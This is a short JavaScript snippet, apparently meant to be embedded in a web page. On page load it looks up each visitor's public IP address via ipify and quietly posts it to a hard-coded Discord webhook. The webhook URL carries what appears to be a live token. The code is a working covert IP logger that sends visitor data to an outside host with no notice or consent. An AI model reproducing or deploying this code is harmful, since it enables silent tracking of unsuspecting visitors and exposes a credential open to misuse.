function getVisitorIp() {
    return fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(error => {
            console.error('Error fetching IP:', error);
            return null;
        });
}
function sendToDiscord(ip) {
    const webhookURL = "https://discord.com/api/webhooks/1295821087795449908/gByTa_Jp4FCOycHzcoebkZFwh_vD37O3Av1HIa573AxLKMap1EdAolZgQvAsIGtVCnxz";

    const payload = {
        content: `New visitor IP address: ${ip}`,
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (response.ok) {
            console.log('Hotovo');
        } else {
            console.error('Failed to send IP address to Discord:', response.statusText);
        }
    })
    .catch(error => {
        console.error('Daco sa dojebalo:', error);
    });
}
window.onload = async function() {
    const ip = await getVisitorIp();
    if (ip) {
        sendToDiscord(ip);
    }
};